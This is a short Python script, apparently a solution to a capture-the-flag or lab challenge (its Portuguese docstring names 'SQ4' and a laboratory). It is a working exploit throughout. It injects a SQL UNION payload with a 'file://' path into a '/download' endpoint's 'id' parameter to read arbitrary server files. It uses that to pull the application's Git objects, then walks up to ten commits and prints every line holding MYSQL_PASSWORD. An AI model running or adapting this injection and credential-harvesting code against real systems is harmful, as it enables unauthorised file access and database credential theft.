"""Reconstrói o histórico Git da SQ4 pela leitura de arquivos do laboratório."""

import sys
import zlib
import requests

if len(sys.argv) != 2:
    raise SystemExit("Uso: python3 ler_historico_git_sq4.py http://<IP>:8000")

base = sys.argv[1].rstrip("/")
root = "/home/mcskidy/app/.git/"


def read(path):
    injection = "8' UNION SELECT 'file://" + path + "' -- -"
    response = requests.get(base + "/download", params={"id": injection}, timeout=10)
    response.raise_for_status()
    return response.content


def obj(sha):
    raw = read(root + "objects/" + sha[:2] + "/" + sha[2:])
    data = zlib.decompress(raw)
    return data.split(b"\0", 1)[1]


def app_blob(tree_sha):
    data = obj(tree_sha)
    i = 0
    while i < len(data):
        end = data.index(b"\0", i)
        mode_name = data[i:end].decode()
        sha = data[end + 1:end + 21].hex()
        if mode_name.endswith(" app.py"):
            return obj(sha).decode()
        i = end + 21
    return ""


sha = read(root + "refs/heads/master").decode().strip()
for number in range(10):
    commit = obj(sha).decode()
    tree = next(line.split()[1] for line in commit.splitlines() if line.startswith("tree "))
    parent = next((line.split()[1] for line in commit.splitlines() if line.startswith("parent ")), None)
    print("COMMIT", number, sha)
    app = app_blob(tree)
    for line in app.splitlines():
        if "MYSQL_PASSWORD" in line:
            print(line)
    if not parent:
        break
    sha = parent
